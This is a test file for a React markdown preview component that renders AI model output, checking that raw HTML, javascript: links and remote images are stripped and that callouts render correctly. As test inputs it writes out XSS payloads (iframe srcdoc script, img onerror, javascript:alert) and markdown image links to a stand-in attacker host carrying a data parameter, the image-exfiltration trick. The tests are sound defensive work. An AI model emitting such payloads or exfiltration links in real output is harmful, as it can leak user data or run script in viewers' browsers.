import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { MarkdownPreview } from "./MarkdownPreview";

function render(md: string): string {
  return renderToStaticMarkup(<MarkdownPreview content={md} />);
}

describe("MarkdownPreview", () => {
  it("never interprets raw HTML from model output", () => {
    const html = render('Before <iframe srcdoc="<script>alert(1)</script>"></iframe> <img src=x onerror="alert(1)"> after');
    expect(html).not.toContain("<iframe");
    expect(html).not.toContain("<img");
    expect(html).toContain("&lt;iframe");
  });

  it("opens links in a new tab without an opener and drops javascript: URLs", () => {
    const html = render("[docs](https://sqlite.org) and [bad](javascript:alert(1))");
    expect(html).toContain('<a href="https://sqlite.org" target="_blank" rel="noopener noreferrer">docs</a>');
    expect(html).not.toContain("javascript:");
  });

  it("never loads images from model output, inline or by reference", () => {
    const inline = render("Fine. ![x](https://evil.example/p.png?d=abc)");
    expect(inline).not.toContain("<img");
    expect(inline).not.toContain("evil.example");
    expect(inline).toContain("Fine. <span>x</span>");

    const byReference = render("See ![chart][r] and ![](https://evil.example/empty.png)\n\n[r]: https://evil.example/r.png");
    expect(byReference).not.toContain("<img");
    expect(byReference).not.toContain("evil.example");
    expect(byReference).toContain("<span>chart</span>");
  });

  it("renders callouts as elements with title and body", () => {
    const html = render("> [!warning] Check this\n> The claim needs a source.\n\nAfter.");
    expect(html).toContain('<div class="callout" data-callout-type="warning">');
    expect(html).toContain('<div class="callout-title">Check this</div>');
    expect(html).toMatch(/<div class="callout-content">\s*<p>The claim needs a source.<\/p>\s*<\/div>/);
    expect(html).toContain("<p>After.</p>");
  });

  it("uses the type as the title when none is given, and leaves plain quotes alone", () => {
    expect(render("> [!tip]\n> Body")).toContain('<div class="callout-title">Tip</div>');
    expect(render("> Just a quote")).toContain("<blockquote>");
  });
});
